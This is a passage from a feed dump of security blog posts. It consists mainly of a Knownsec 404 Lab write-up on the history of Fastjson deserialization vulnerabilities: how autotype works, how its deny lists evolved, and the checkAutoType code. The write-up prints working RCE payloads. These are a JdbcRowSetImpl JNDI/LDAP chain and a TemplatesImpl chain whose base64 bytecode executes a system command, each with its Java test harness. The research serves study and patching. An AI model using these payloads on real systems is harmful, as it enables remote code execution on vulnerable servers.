Zoomeye，如果你之前登陆过Zoomeye那么会直接自动登录，如果没有登录，则需要在telnet404页面登录。登录完成后等待一会儿就可以加载完成。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/9df18fdc-89a0-4e5f-8c47-e4d6937db81a.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在访问网页时，点击右上角的插件图标，我们就能看到相关ip的信息以及开放端口</p>\n\n\n\n<h1 id=\"_5\">写在最后</h1>\n\n\n\n<p>最后我们上传chrome开发者中心之后只要等待审核通过就可以发布出去了。</p>\n\n\n\n<p>最终chrome插件下载链接：</p>\n\n\n\n<ul><li><a href=\"https://chrome.google.com/webstore/detail/zoomeye-tools/bdoaeiibkccgkbjbmmmoemghacnkbklj\">Zoomeye Tools下载链接</a></li></ul>\n\n\n\n<hr class=\"wp-block-separator\" />\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg\" alt=\"Paper\" /></figure>\n\n\n\n<p>本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href=\"https://paper.seebug.org/1115/\">https://paper.seebug.org/1115/</a><br></p>\n","descriptionType":"html","publishedDate":"Fri, 31 Jul 2020 03:51:55 +0000","feedId":2536,"bgimg":"https://images.seebug.org/content/images/2020/01/a6d6c012-36c8-47e1-9de0-cef8eaec4b27.png-w331s","linkMd5":"23161d8db2ce524c7b61906d36af8d85","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn66@2020_3/2020/08/24/21-14-50-262_ce570ca401c1234c.webp","destWidth":612,"destHeight":496,"sourceBytes":7964,"destBytes":12842,"author":"叶霖 杨","articleImgCdnMap":{"https://images.seebug.org/content/images/2020/01/a6d6c012-36c8-47e1-9de0-cef8eaec4b27.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn66@2020_3/2020/08/24/21-14-50-262_ce570ca401c1234c.webp","https://images.seebug.org/content/images/2020/01/9b5e40a0-1388-4093-b47c-70499ab8624e.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn54@2020_5/2020/08/24/21-14-57-728_5020103e458a0719.webp","https://images.seebug.org/content/images/2020/01/85c46e35-d4a0-42fc-b333-67aa451505a4.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn99@2020_1/2020/08/24/21-14-59-277_011a8ae5329d9f7c.webp","https://images.seebug.org/content/images/2020/01/cbf9a0f6-df4e-466c-89a1-eb55c489f1af.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn26@2020_1/2020/08/24/21-14-56-283_6114396f13593cf9.webp","https://images.seebug.org/content/images/2020/01/32467390-67b4-401c-84b7-bce8b36c04b5.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn78@2020_3/2020/08/24/21-14-54-584_d11c3b16c46efe01.webp","https://images.seebug.org/content/images/2020/01/8d773148-62b9-4594-8213-5566fbdfb499.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn27@2020_6/2020/08/24/21-15-01-207_8fc332a7e8199b52.webp","https://images.seebug.org/content/images/2020/02/bad4d79b-169f-4e8f-b2c8-995a9ad78277.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn54@2020_1/2020/08/24/21-14-55-546_c674009bfabdb6b2.webp","https://images.seebug.org/content/images/2020/02/3cabfcff-59f9-462e-9535-c2e8ea2a34e9.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn43@2020_2/2020/08/24/21-14-54-157_c3cda1a7b177e3d6.webp","https://images.seebug.org/content/images/2020/02/9df18fdc-89a0-4e5f-8c47-e4d6937db81a.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn33@2020_2/2020/08/24/21-14-57-510_c16233cea68d6e54.webp","https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn7@2020_5/2020/08/24/21-15-00-499_446834a71d30acd0.webp"},"publishedOrCreatedDate":1598303688713},{"createdTime":"2020-08-25 05:14:48","updatedTime":"2020-08-25 05:14:48","title":"Fastjson 反序列化漏洞史","link":"https://blog.knownsec.com/?p=5015","description":"\n<p><strong>作者：Longofo@知道创宇404实验室</strong><br><strong>时间：2020年4月27日</strong><br><strong>英文版本：<a href=\"https://paper.seebug.org/1193/\">https://paper.seebug.org/1193/</a></strong></p>\n\n\n\n<p>Fastjson没有cve编号，不太好查找时间线，一开始也不知道咋写，不过还是慢慢写出点东西，幸好fastjson开源以及有师傅们的一路辛勤记录。文中将给出与Fastjson漏洞相关的比较关键的更新以及漏洞时间线，会对一些比较经典的漏洞进行测试及修复说明，给出一些探测payload，rce payload。</p>\n\n\n\n<h4 id=\"fastjson\">Fastjson解析流程</h4>\n\n\n\n<p>可以参考下@Lucifaer师傅写的<a href=\"https://paper.seebug.org/994/\">fastjson流程分析</a>，这里不写了，再写篇幅就占用很大了。文中提到fastjson有使用ASM生成的字节码，由于实际使用中很多类都不是原生类，fastjson序列化/反序列化大多数类时都会用ASM处理，如果好奇想查看生成的字节码，可以用idea动态调试时保存字节文件：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/aa962743-3baf-4fe9-acbb-c012bfac2c38.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>插入的代码为：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">BufferedOutputStream bos = null;\nFileOutputStream fos = null;\nFile file = null;\nString filePath = &#34;F:/java/javaproject/fastjsonsrc/target/classes/&#34; + packageName.replace(&#34;.&#34;,&#34;/&#34;) + &#34;/&#34;;\ntry {\n    File dir = new File(filePath);\n    if (!dir.exists()) {\n        dir.mkdirs();\n    }\n    file = new File(filePath + className + &#34;.class&#34;);\n    fos = new FileOutputStream(file);\n    bos = new BufferedOutputStream(fos);\n    bos.write(code);\n} catch (Exception e) {\n    e.printStackTrace();\n} finally {\n    if (bos != null) {\n        try {\n            bos.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    if (fos != null) {\n        try {\n            fos.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}</pre>\n\n\n\n<p>生成的类：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/ced3c3bc-76c0-4109-9e9e-5e9ec40084b1.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>但是这个类并不能用于调试，因为fastjson中用ASM生成的代码没有linenumber、trace等用于调试的信息，所以不能调试。不过通过在Expression那个窗口重写部分代码，生成可用于调式的bytecode应该也是可行的（我没有测试，如果有时间和兴趣，可以看下ASM怎么生成可用于调试的字节码）。</p>\n\n\n\n<h4 id=\"fastjson_1\">Fastjson 样例测试</h4>\n\n\n\n<p>首先用多个版本测试下面这个例子：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">//User.java\npackage com.longofo.test;\n\npublic class User {\n    private String name; //私有属性，有getter、setter方法\n    private int age; //私有属性，有getter、setter方法\n    private boolean flag; //私有属性，有is、setter方法\n    public String sex; //公有属性，无getter、setter方法\n    private String address; //私有属性，无getter、setter方法\n\n    public User() {\n        System.out.println(&#34;call User default Constructor&#34;);\n    }\n\n    public String getName() {\n        System.out.println(&#34;call User getName&#34;);\n        return name;\n    }\n\n    public void setName(String name) {\n        System.out.println(&#34;call User setName&#34;);\n        this.name = name;\n    }\n\n    public int getAge() {\n        System.out.println(&#34;call User getAge&#34;);\n        return age;\n    }\n\n    public void setAge(int age) {\n        System.out.println(&#34;call User setAge&#34;);\n        this.age = age;\n    }\n\n    public boolean isFlag() {\n        System.out.println(&#34;call User isFlag&#34;);\n        return flag;\n    }\n\n    public void setFlag(boolean flag) {\n        System.out.println(&#34;call User setFlag&#34;);\n        this.flag = flag;\n    }\n\n    @Override\n    public String toString() {\n        return &#34;User{&#34; +\n                &#34;name='&#34; + name + '\\'' +\n                &#34;, age=&#34; + age +\n                &#34;, flag=&#34; + flag +\n                &#34;, sex='&#34; + sex + '\\'' +\n                &#34;, address='&#34; + address + '\\'' +\n                '}';\n    }\n}</pre>\n\n\n\n<pre class=\"crayon-plain-tag\">package com.longofo.test;\n\nimport com.alibaba.fastjson.JSON;\n\npublic class Test1 {\n    public static void main(String[] args) {\n        //序列化\n        String serializedStr = &#34;{\\&#34;@type\\&#34;:\\&#34;com.longofo.test.User\\&#34;,\\&#34;name\\&#34;:\\&#34;lala\\&#34;,\\&#34;age\\&#34;:11, \\&#34;flag\\&#34;: true,\\&#34;sex\\&#34;:\\&#34;boy\\&#34;,\\&#34;address\\&#34;:\\&#34;china\\&#34;}&#34;;//\n        System.out.println(&#34;serializedStr=&#34; + serializedStr);\n\n        System.out.println(&#34;-----------------------------------------------\\n\\n&#34;);\n        //通过parse方法进行反序列化，返回的是一个JSONObject]\n        System.out.println(&#34;JSON.parse(serializedStr)：&#34;);\n        Object obj1 = JSON.parse(serializedStr);\n        System.out.println(&#34;parse反序列化对象名称:&#34; + obj1.getClass().getName());\n        System.out.println(&#34;parse反序列化：&#34; + obj1);\n        System.out.println(&#34;-----------------------------------------------\\n&#34;);\n\n        //通过parseObject,不指定类，返回的是一个JSONObject\n        System.out.println(&#34;JSON.parseObject(serializedStr)：&#34;);\n        Object obj2 = JSON.parseObject(serializedStr);\n        System.out.println(&#34;parseObject反序列化对象名称:&#34; + obj2.getClass().getName());\n        System.out.println(&#34;parseObject反序列化:&#34; + obj2);\n        System.out.println(&#34;-----------------------------------------------\\n&#34;);\n\n        //通过parseObject,指定为object.class\n        System.out.println(&#34;JSON.parseObject(serializedStr, Object.class)：&#34;);\n        Object obj3 = JSON.parseObject(serializedStr, Object.class);\n        System.out.println(&#34;parseObject反序列化对象名称:&#34; + obj3.getClass().getName());\n        System.out.println(&#34;parseObject反序列化:&#34; + obj3);\n        System.out.println(&#34;-----------------------------------------------\\n&#34;);\n\n        //通过parseObject,指定为User.class\n        System.out.println(&#34;JSON.parseObject(serializedStr, User.class)：&#34;);\n        Object obj4 = JSON.parseObject(serializedStr, User.class);\n        System.out.println(&#34;parseObject反序列化对象名称:&#34; + obj4.getClass().getName());\n        System.out.println(&#34;parseObject反序列化:&#34; + obj4);\n        System.out.println(&#34;-----------------------------------------------\\n&#34;);\n    }\n}</pre>\n\n\n\n<p><strong>说明</strong>：</p>\n\n\n\n<ul><li>这里的@type就是对应常说的autotype功能，简单理解为fastjson会自动将json的<code>key:value</code>值映射到@type对应的类中</li><li>样例User类的几个方法都是比较普通的方法，命名、返回值也都是常规的符合bean要求的写法，所以下面的样例测试有的特殊调用不会覆盖到，但是在漏洞分析中，可以看到一些特殊的情况</li><li>parse用了四种写法，四种写法都能造成危害（不过实际到底能不能利用，还得看版本和用户是否打开了某些配置开关，具体往后看）</li><li>样例测试都使用jdk8u102，代码都是拉的源码测，主要是用样例说明autotype的默认开启、checkautotype的出现、以及黑白名白名单从哪个版本开始出现的过程以及增强手段</li></ul>\n\n\n\n<h5 id=\"11157\">1.1.157测试</h5>\n\n\n\n<p>这应该是最原始的版本了（tag最早是这个），结果：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">serializedStr={&#34;@type&#34;:&#34;com.longofo.test.User&#34;,&#34;name&#34;:&#34;lala&#34;,&#34;age&#34;:11, &#34;flag&#34;: true,&#34;sex&#34;:&#34;boy&#34;,&#34;address&#34;:&#34;china&#34;}\n-----------------------------------------------\n\n\nJSON.parse(serializedStr)：\ncall User default Constructor\ncall User setName\ncall User setAge\ncall User setFlag\nparse反序列化对象名称:com.longofo.test.User\nparse反序列化：User{name='lala', age=11, flag=true, sex='boy', address='null'}\n-----------------------------------------------\n\nJSON.parseObject(serializedStr)：\ncall User default Constructor\ncall User setName\ncall User setAge\ncall User setFlag\ncall User getAge\ncall User isFlag\ncall User getName\nparseObject反序列化对象名称:com.alibaba.fastjson.JSONObject\nparseObject反序列化:{&#34;flag&#34;:true,&#34;sex&#34;:&#34;boy&#34;,&#34;name&#34;:&#34;lala&#34;,&#34;age&#34;:11}\n-----------------------------------------------\n\nJSON.parseObject(serializedStr, Object.class)：\ncall User default Constructor\ncall User setName\ncall User setAge\ncall User setFlag\nparseObject反序列化对象名称:com.longofo.test.User\nparseObject反序列化:User{name='lala', age=11, flag=true, sex='boy', address='null'}\n-----------------------------------------------\n\nJSON.parseObject(serializedStr, User.class)：\ncall User default Constructor\ncall User setName\ncall User setAge\ncall User setFlag\nparseObject反序列化对象名称:com.longofo.test.User\nparseObject反序列化:User{name='lala', age=11, flag=true, sex='boy', address='null'}\n-----------------------------------------------</pre>\n\n\n\n<p>下面对每个结果做一个简单的说明</p>\n\n\n\n<h6 id=\"jsonparseserializedstr\">JSON.parse(serializedStr)</h6>\n\n\n\n<pre class=\"crayon-plain-tag\">JSON.parse(serializedStr)：\ncall User default Constructor\ncall User setName\ncall User setAge\ncall User setFlag\nparse反序列化对象名称:com.longofo.test.User\nparse反序列化：User{name='lala', age=11, flag=true, sex='boy', address='null'}</pre>\n\n\n\n<p>在指定了@type的情况下，自动调用了User类默认构造器，User类对应的setter方法（setAge，setName）,最终结果是User类的一个实例，不过值得注意的是public sex被成功赋值了，private address没有成功赋值，不过在1.2.22, 1.1.54.android之后，增加了一个SupportNonPublicField特性，如果使用了这个特性，那么private address就算没有setter、getter也能成功赋值，这个特性也与后面的一个漏洞有关。注意默认构造方法、setter方法调用顺序，默认构造器在前，此时属性值还没有被赋值，所以即使默认构造器中存在危险方法，但是危害值还没有被传入，所以默认构造器按理来说不会成为漏洞利用方法，不过对于内部类那种，外部类先初始化了自己的某些属性值，但是内部类默认构造器使用了父类的属性的某些值，依然可能造成危害。</p>\n\n\n\n<p>可以看出，从最原始的版本就开始有autotype功能了，并且autotype默认开启。同时ParserConfig类中还没有黑名单。</p>\n\n\n\n<h6 id=\"jsonparseobjectserializedstr\">JSON.parseObject(serializedStr)</h6>\n\n\n\n<pre class=\"crayon-plain-tag\">JSON.parseObject(serializedStr)：\ncall User default Constructor\ncall User setName\ncall User setAge\ncall User setFlag\ncall User getAge\ncall User isFlag\ncall User getName\nparseObject反序列化对象名称:com.alibaba.fastjson.JSONObject\nparseObject反序列化:{&#34;flag&#34;:true,&#34;sex&#34;:&#34;boy&#34;,&#34;name&#34;:&#34;lala&#34;,&#34;age&#34;:11}</pre>\n\n\n\n<p>在指定了@type的情况下，自动调用了User类默认构造器，User类对应的setter方法（setAge，setName）以及对应的getter方法（getAge，getName），最终结果是一个字符串。这里还多调用了getter（注意bool类型的是is开头的）方法，是因为parseObject在没有其他参数时，调用了<code>JSON.toJSON(obj)</code>，后续会通过gettter方法获取obj属性值：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/985e89cf-2cb5-484a-9e88-10567d6d87a3.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/f523f88c-6e76-457c-a1b0-9fdbbb852a05.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h6 id=\"jsonparseobjectserializedstr-objectclass\">JSON.parseObject(serializedStr, Object.class)</h6>\n\n\n\n<pre class=\"crayon-plain-tag\">JSON.parseObject(serializedStr, Object.class)：\ncall User default Constructor\ncall User setName\ncall User setAge\ncall User setFlag\nparseObject反序列化对象名称:com.longofo.test.User\nparseObject反序列化:User{name='lala', age=11, flag=true, sex='boy', address='null'}</pre>\n\n\n\n<p>在指定了@type的情况下，这种写法和第一种<code>JSON.parse(serializedStr)</code>写法其实没有区别的，从结果也能看出。</p>\n\n\n\n<h6 id=\"jsonparseobjectserializedstr-userclass\">JSON.parseObject(serializedStr, User.class)</h6>\n\n\n\n<pre class=\"crayon-plain-tag\">JSON.parseObject(serializedStr, User.class)：\ncall User default Constructor\ncall User setName\ncall User setAge\ncall User setFlag\nparseObject反序列化对象名称:com.longofo.test.User\nparseObject反序列化:User{name='lala', age=11, flag=true, sex='boy', address='null'}</pre>\n\n\n\n<p>在指定了@type的情况下，自动调用了User类默认构造器，User类对应的setter方法（setAge，setName），最终结果是User类的一个实例。这种写法明确指定了目标对象必须是User类型，如果@type对应的类型不是User类型或其子类，将抛出不匹配异常，但是，就算指定了特定的类型，依然有方式在类型匹配之前来触发漏洞。</p>\n\n\n\n<h5 id=\"1210\">1.2.10测试</h5>\n\n\n\n<p>对于上面User这个类，测试结果和1.1.157一样，这里不写了。</p>\n\n\n\n<p>到这个版本autotype依然默认开启。不过从这个版本开始，fastjson在ParserConfig中加入了denyList，一直到1.2.24版本，这个denyList都只有一个类（不过这个java.lang.Thread不是用于漏洞利用的）：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/4112990e-9522-493d-8188-c79e1779fd8e.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h5 id=\"1225\">1.2.25测试</h5>\n\n\n\n<p>测试结果是抛出出了异常：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">serializedStr={&#34;@type&#34;:&#34;com.longofo.test.User&#34;,&#34;name&#34;:&#34;lala&#34;,&#34;age&#34;:11, &#34;flag&#34;: true}\n-----------------------------------------------\n\n\nJSON.parse(serializedStr)：\nException in thread &#34;main&#34; com.alibaba.fastjson.JSONException: autoType is not support. com.longofo.test.User\n    at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:882)\n    at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:322)\n    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)\n    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293)\n    at com.alibaba.fastjson.JSON.parse(JSON.java:137)\n    at com.alibaba.fastjson.JSON.parse(JSON.java:128)\n    at com.longofo.test.Test1.main(Test1.java:14)</pre>\n\n\n\n<p>从1.2.25开始，autotype默认关闭了，对于autotype开启，后面漏洞分析会涉及到。并且从1.2.25开始，增加了checkAutoType函数，它的主要作用是检测@type指定的类是否在白名单、黑名单（使用的startswith方式）</p>\n\n\n\n<p>以及目标类是否是两个危险类（Classloader、DataSource）的子类或者子接口，其中白名单优先级最高，白名单如果允许就不检测黑名单与危险类，否则继续检测黑名单与危险类：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/78109ea2-fc51-4896-8a9a-93e73b197891.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>增加了黑名单类、包数量，同时增加了白名单，用户还可以调用相关方法添加黑名单/白名单到列表中：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/7b9cae35-a1a4-4f89-a96f-8d5e8430f4a4.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>后面的许多漏洞都是对checkAutotype以及本身某些逻辑缺陷导致的漏洞进行修复，以及黑名单的不断增加。</p>\n\n\n\n<h5 id=\"1242\">1.2.42测试</h5>\n\n\n\n<p>与1.2.25一样，默认不开启autotype，所以结果一样，直接抛autotype未开启异常。</p>\n\n\n\n<p>从这个版本开始，将denyList、acceptList换成了十进制的hashcode，使得安全研究难度变大了（不过hashcode的计算方法依然是公开的，假如拥有大量的jar包，例如maven仓库可以爬jar包下来，可批量的跑类名、包名，不过对于黑名单是包名的情况，要找到具体可利用的类也会消耗一些时间）：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/247f9866-4481-4c82-b372-95c0d56df76f.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>checkAutotype中检测也做了相应的修改：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/0006a9e3-ab96-4dbe-bac3-fc90f7f156f0.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h5 id=\"1261\">1.2.61测试</h5>\n\n\n\n<p>与1.2.25一样，默认不开启autotype，所以结果一样，直接抛autotype未开启异常。</p>\n\n\n\n<p>从1.2.25到1.2.61之前其实还发生了很多绕过与黑名单的增加，不过这部分在后面的漏洞版本线在具体写，这里写1.2.61版本主要是说明黑名单防御所做的手段。在1.2.61版本时，fastjson将hashcode从十进制换成了十六进制：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/12f037cb-ba9b-4635-8421-5a57331766d8.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>不过用十六进制表示与十进制表示都一样，同样可以批量跑jar包。在1.2.62版本为了统一又把十六进制大写：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/b09114c5-0e75-4660-acd7-7798c55f7122.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>再之后的版本就是黑名单的增加了</p>\n\n\n\n<h4 id=\"fastjson_2\">Fastjson漏洞版本线</h4>\n\n\n\n<p>下面漏洞不会过多的分析，太多了，只会简单说明下以及给出payload进行测试与说明修复方式。</p>\n\n\n\n<h5 id=\"ver1224\">ver&#60;=1.2.24</h5>\n\n\n\n<p>从上面的测试中可以看到，1.2.24及之前没有任何防御，并且autotype默认开启，下面给出那会比较经典的几个payload。</p>\n\n\n\n<h6 id=\"comsunrowsetjdbcrowsetimpl\">com.sun.rowset.JdbcRowSetImpl利用链</h6>\n\n\n\n<p>payload：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">{\n  &#34;rand1&#34;: {\n    &#34;@type&#34;: &#34;com.sun.rowset.JdbcRowSetImpl&#34;,\n    &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;,\n    &#34;autoCommit&#34;: true\n  }\n}</pre>\n\n\n\n<p>测试（jdk=8u102，fastjson=1.2.24）：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">package com.longofo.test;\n\nimport com.alibaba.fastjson.JSON;\n\npublic class Test2 {\n    public static void main(String[] args) {\n        String payload = &#34;{\\&#34;rand1\\&#34;:{\\&#34;@type\\&#34;:\\&#34;com.sun.rowset.JdbcRowSetImpl\\&#34;,\\&#34;dataSourceName\\&#34;:\\&#34;ldap://localhost:1389/Object\\&#34;,\\&#34;autoCommit\\&#34;:true}}&#34;;\n//        JSON.parse(payload); 成功\n        //JSON.parseObject(payload); 成功\n        //JSON.parseObject(payload,Object.class); 成功\n        //JSON.parseObject(payload, User.class); 成功，没有直接在外层用@type，加了一层rand:{}这样的格式，还没到类型匹配就能成功触发，这是在xray的一篇文中看到的https://zhuanlan.zhihu.com/p/99075925，所以后面的payload都使用这种模式\n    }\n}</pre>\n\n\n\n<p>结果：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/15529a91-35a8-4198-b2d7-159a36920575.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>触发原因简析：</p>\n\n\n\n<p>JdbcRowSetImpl对象恢复-&#62;setDataSourceName方法调用-&#62;setAutocommit方法调用-&#62;context.lookup(datasourceName)调用</p>\n\n\n\n<h6 id=\"comsunorgapachexalaninternalxsltctraxtemplatesimpl\">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl利用链</h6>\n\n\n\n<p>payload：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">{\n  &#34;rand1&#34;: {\n    &#34;@type&#34;: &#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;,\n    &#34;_bytecodes&#34;: [\n      &#34;yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ&#34;\n    ],\n    &#34;_name&#34;: &#34;aaa&#34;,\n    &#34;_tfactory&#34;: {},\n    &#34;_outputProperties&#34;: {}\n  }\n}</pre>\n\n\n\n<p>测试（jdk=8u102，fastjson=1.2.24）：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">package com.longofo.test;\n\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.Feature;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.commons.codec.binary.Base64;\n\npublic class Test3 {\n    public static void main(String[] args) throws Exception {\n        String evilCode_base64 = readClass();\n        final String NASTY_CLASS = &#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;;\n        String payload = &#34;{'rand1':{&#34; +\n                &#34;\\&#34;@type\\&#34;:\\&#34;&#34; + NASTY_CLASS + &#34;\\&#34;,&#34; +\n                &#34;\\&#34;_bytecodes\\&#34;:[\\&#34;&#34; + evilCode_base64 + &#34;\\&#34;],&#34; +\n                &#34;'_name':'aaa',&#34; +\n                &#34;'_tfactory':{},&#34; +\n                &#34;'_outputProperties':{}&#34; +\n                &#34;}}\\n&#34;;\n        System.out.println(payload);\n        //JSON.parse(payload, Feature.SupportNonPublicField); 成功\n        //JSON.parseObject(payload, Feature.SupportNonPublicField); 成功\n        //JSON.parseObject(payload, Object.class, Feature.SupportNonPublicField); 成功\n        //JSON.parseObject(payload, User.class, Feature.SupportNonPublicField); 成功\n    }\n\n    public static class AaAa {\n\n    }\n\n    public static String readClass() throws Exception {\n        ClassPool pool = ClassPool.getDefault();\n        CtClass cc = pool.get(AaAa.class.getName());\n        String cmd = &#34;java.lang.Runtime.getRuntime().exec(\\&#34;calc\\&#34;);&#34;;\n        cc.makeClassInitializer().insertBefore(cmd);\n        String randomClassName = &#34;AaAa&#34; + System.nanoTime();\n        cc.setName(randomClassName);\n        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));\n        byte[] evilCode = cc.toBytecode();\n\n        return Base64.encodeBase64String(evilCode);\n\n    }\n}</pre>\n\n\n\n<p>结果：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/7c0ff045-44e1-4e31-b433-0d935f1f5055.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>触发原因简析：</p>\n\n\n\n<p>TemplatesImpl对象恢复-&#62;JavaBeanDeserializer.deserialze-&#62;FieldDeserializer.setValue-&#62;TemplatesImpl.getOutputProperties-&#62;TemplatesImpl.newTransformer-&#62;TemplatesImpl.getTransletInstance-&#62;通过defineTransletClasses，newInstance触发我们自己构造的class的静态代码块</p>\n\n\n\n<p>简单说明：</p>\n\n\n\n<p>这个漏洞需要开启SupportNonPublicField特性，这在样例测试中也说到了。因为TemplatesImpl类中<code>_bytecodes</code>、<code>_tfactory</code>、<code>_name</code>、<code>_outputProperties</code>、<code>_class</code>并没有对应的setter，所以要为这些private属性赋值，就需要开启SupportNonPublicField特性。具体这个poc构造过程，这里不分析了，可以看下廖大师傅的<a href=\"http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/\">这篇</a>，涉及到了一些细节问题。</p>\n\n\n\n<h5 id=\"ver1225ver1241\">ver&#62;=1.2.25&#38;ver&#60;=1.2.41</h5>\n\n\n\n<p>1.2.24之前没有autotype的限制，从1.2.25开始默认关闭了autotype支持，并且加入了checkAutotype，加入了黑名单+白名单来防御autotype开启的情况。在1.2.25到1.2.41之间，发生了一次checkAutotype的绕过。</p>\n\n\n\n<p>下面是checkAutoType代码：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">public Class&#38;lt;?&#38;gt; checkAutoType(String typeName, Class&#38;lt;?&#38;gt; expectClass) {\n        if (typeName == null) {\n            return null;\n        }\n\n        final String className = typeName.replace('$', '.');\n\n        // 位置1，开启了autoTypeSupport，先白名单，再黑名单\n        if (autoTypeSupport || expectClass != null) {\n            for (int i = 0; i &#38;lt; acceptList.length; ++i) {\n                String accept = acceptList[i];\n                if (className.startsWith(accept)) {\n                    return TypeUtils.loadClass(typeName, defaultClassLoader);\n                }\n            }\n\n            for (int i = 0; i &#38;lt; denyList.length; ++i) {\n                String deny = denyList[i];\n                if (className.startsWith(deny)) {\n                    throw new JSONException(&#34;autoType is not support. &#34; + typeName);\n                }\n            }\n        